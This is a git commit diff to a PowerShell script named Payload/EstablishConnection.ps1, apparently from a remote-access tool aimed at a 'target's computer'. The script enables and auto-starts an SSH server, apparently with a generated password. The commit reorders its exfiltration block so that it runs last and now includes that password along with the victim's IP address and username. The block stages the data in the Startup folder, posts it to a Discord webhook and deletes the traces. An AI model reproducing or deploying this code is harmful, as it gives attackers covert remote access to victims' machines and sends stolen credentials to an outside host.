dbb45282bebb84f3800a4745279127c24388a694
ReylanTeo <109081015+ReylanTeo@users.noreply.github.com>
2023-10-30 17:14:47 +0800

    Fixed

--- Payload/EstablishConnection.ps1
+++ Payload/EstablishConnection.ps1
@@ -1,54 +1,6 @@
 # None of the files created will be saved on the target's computer
 # TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead
 
-# Get IPv4 address of the machine
-$ipAddressString = "IPv4 Address"
-# Uncomment the following line when using older versions of Windows without IPv6 support
-# $ipAddressString = "IP Address"
-$ipconfigOutput = ipconfig
-$IPAddress = $ipconfigOutput | Select-String -Pattern $ipAddressString | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1
-
-# Get the current user's username
-$Username = $env:USERNAME
-
-# Get the user's profile folder
-$UserProfileFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
-$StartupDirectory = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-
-# Define the path to the file containing the Discord webhook URL
-$DiscordWebhookURLFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\DiscordWebhookURL.icu"
-# Use Get-Content to read the file and store its content in a variable
-$DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile
-
-# Create a text file in the user's startup folder
-$TextContent = "$IPAddress`n$Username"
-$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\$Username.icu"
-$TextContent | Out-File -FilePath $TextFile
-
-# Define a message (commented out for now)
-# $Message = "Message Placeholder"
-
-# Create a multipart form-data payload
-$Boundary = [System.Guid]::NewGuid().ToString()
-$CRLF = "`r`n"
-$Payload = "--$Boundary$CRLF" +
-    "Content-Disposition: form-data; name=`"content`"$CRLF$CRLF$Message$CRLF" +
-    "--$Boundary$CRLF" +
-    "Content-Disposition: form-data; name=`"file`"; filename=`"$Username.txt`"$CRLF" +
-    "Content-Type: application/octet-stream$CRLF$CRLF" +
-    (Get-Content -Path $TextFile) + $CRLF +
-    "--$Boundary--"
-# Set the headers for the request
-$Headers = @{
-    "Content-Type" = "multipart/form-data; boundary=$Boundary"
-}
-
-# Send the payload to Discord
-Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Headers $Headers -Body $Payload
-
-# Delete the text file
-Remove-Item -Path $TextFile
-
 # Generate random password
 function Generate-StrongPassword {
     # Generate a stronger password with at least one upper case letter, one lower case letter, one digit, and one special character.
@@ -100,3 +52,51 @@ Start-Service sshd
 
 # Set the sshd service to start automatically
 Set-Service -Name sshd -StartupType "Automatic"
+
+# Get IPv4 address of the machine
+$IPAddressString = "IPv4 Address"
+# Uncomment the following line when using older versions of Windows without IPv6 support
+# $IPAddressString = "IP Address"
+$IPconfigOutput = ipconfig
+$IPAddress = $IPconfigOutput | Select-String -Pattern $IPAddressString | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1
+
+# Get the current user's username
+$Username = $env:USERNAME
+
+# Get the user's profile folder
+$UserProfileFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
+$StartupDirectory = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+# Define the path to the file containing the Discord webhook URL
+$DiscordWebhookURLFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\DiscordWebhookURL.icu"
+# Use Get-Content to read the file and store its content in a variable
+$DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile
+
+# Create a text file in the user's startup folder
+$TextContent = "$IPAddress`n$Username`n$SecurePassword"
+$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\$Username.icu"
+$TextContent | Out-File -FilePath $TextFile
+
+# Define a message (commented out for now)
+# $Message = "Message Placeholder"
+
+# Create a multipart form-data payload
+$Boundary = [System.Guid]::NewGuid().ToString()
+$CRLF = "`r`n"
+$Payload = "--$Boundary$CRLF" +
+    "Content-Disposition: form-data; name=`"content`"$CRLF$CRLF$Message$CRLF" +
+    "--$Boundary$CRLF" +
+    "Content-Disposition: form-data; name=`"file`"; filename=`"$Username.txt`"$CRLF" +
+    "Content-Type: application/octet-stream$CRLF$CRLF" +
+    (Get-Content -Path $TextFile) + $CRLF +
+    "--$Boundary--"
+# Set the headers for the request
+$Headers = @{
+    "Content-Type" = "multipart/form-data; boundary=$Boundary"
+}
+
+# Send the payload to Discord
+Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Headers $Headers -Body $Payload
+
+# Delete the text file
+Remove-Item -Path $TextFile
